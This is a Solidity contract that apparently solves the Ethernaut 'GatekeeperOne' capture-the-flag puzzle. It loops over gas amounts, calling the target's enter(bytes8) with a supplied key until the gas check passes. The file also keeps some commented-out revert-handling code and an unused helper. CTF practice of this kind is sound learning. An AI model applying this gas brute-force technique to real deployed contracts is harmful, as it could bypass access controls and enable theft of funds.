// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneHacker {
    GatekeeperOne gatekeeper;
    uint256 constant gasCostOfGateOne = 149;
    constructor(address _gatekeeper) {
        gatekeeper = GatekeeperOne(_gatekeeper);
    }

    // Tries a range of gas values and returns the first gas amount that worked (or 0 if none)
    function bruteForceEnter(bytes8 key, uint256 startGasIteorator, uint256 endGasIteorator) public returns (uint256) {
        uint256 base = 8191;
        for (uint256 gasAmt = startGasIteorator; gasAmt <= endGasIteorator; gasAmt++) {
            uint256 finalGasAmount = (gasAmt * base) + gasCostOfGateOne;
            (bool success, ) = address(gatekeeper).call{gas: finalGasAmount}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                return gasAmt;  // Found gas amount that passed gateTwo
            }
            // if (!success) {
            //     if (returndata.length > 0) {
            //         // Bubble up revert reason from returndata
            //         assembly {
            //             let returndata_size := mload(returndata)
            //             revert(add(32, returndata), returndata_size)
            //         }
            //     } else {
            //         revert("Call failed without revert reason");
            //     }
            // }
        }
        require(false, "No success in range");
        return 0;
    }

    // Helper event to log revert reasons
    event DebugRevertReason(uint256 attempt, string reason);

    // Helper to decode revert reason from returndata
    function _getRevertMsg(bytes memory _returnData) internal pure returns (string memory) {
        // If the returndata length is less than 68, then the transaction failed silently (without a revert message)
        if (_returnData.length < 68) return 'Transaction reverted silently';
        assembly {
            // Slice the sighash.
            _returnData := add(_returnData, 0x04)
        }
        return abi.decode(_returnData, (string)); // All that remains is the revert string
    }

    
}